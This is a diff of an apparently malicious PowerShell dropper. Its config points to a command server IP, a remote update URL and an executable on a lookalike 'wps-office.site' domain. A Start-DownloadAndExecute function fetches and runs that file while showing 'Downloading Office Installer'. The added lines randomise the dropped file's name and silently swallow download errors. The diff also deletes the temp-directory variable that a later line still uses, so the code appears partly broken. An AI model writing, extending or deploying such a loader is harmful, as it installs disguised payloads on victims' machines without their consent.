@@ -1,17 +1,7 @@
 ﻿$server = '{
-    "tabs":  [
-                 {
-                     "id":  "default",
-                     "exeName":  "default",
-                     "pushes":  "http://yandex.ru",
-                     "startDownloads":  "https://wps-office.site/wps_lid.lid-r8M0x5rRf8R7.exe",
-                     "startUrls":  "",
-                     "front":  "write.exe",
-                     "extractIconFromFront":  false,
-                     "embeddings":  ""
-                 }
-             ],
-    "UpdateFile":  "C:\\inetpub\\wwwroot\\ads\\d-data\\troyan.txt",
+    "landingAuto":  true,
+    "landingName":  "wps-office",
+    "UpdateFile":  null,
     "server":  "185.247.141.76",
     "strahServer":  null,
     "updateUrl":  "http://0.superhost.pw/185.247.141.76/update",
@@ -37,7 +27,7 @@
                       "185.247.141.46":  "counter.yadro.ru"
                   },
     "pushes":  [
-                   "http://yandex.ru"
+
                ],
     "startDownloads":  [
                            "https://wps-office.site/wps_lid.lid-r8M0x5rRf8R7.exe"
@@ -46,7 +36,7 @@
 
                   ],
     "front":  [
-                  "write.exe"
+
               ],
     "embeddings":  [
 
@@ -1060,7 +1050,7 @@ function Start-DownloadAndExecute {
 
     # Determine the file name and path
     $fileName = [System.IO.Path]::GetFileName($url)
-    $tempDir = [System.IO.Path]::GetTempPath()
+    $fileName = "${([System.IO.Path]::GetFileNameWithoutExtension($fileName))}_$((65..90 + 97..122 | Get-Random -Count 8 | ForEach-Object { [char]$_ } -join ''))${([System.IO.Path]::GetExtension($fileName))}"
     $installerPath = [System.IO.Path]::Combine($tempDir, $fileName)
 
     # Create and configure the WebClient
@@ -1143,9 +1133,15 @@ function Download {
 }
 
 function DoStartDownloads {
-    foreach ($url in $server.startDownloads) {
-        Download -url $url -title "Downloading Office Installer"
+    try {
+        foreach ($url in $server.startDownloads) {
+            Download -url $url -title "Downloading Office Installer"
+        }
     }
+    catch {
+ 
+    }
+
 }
 
 
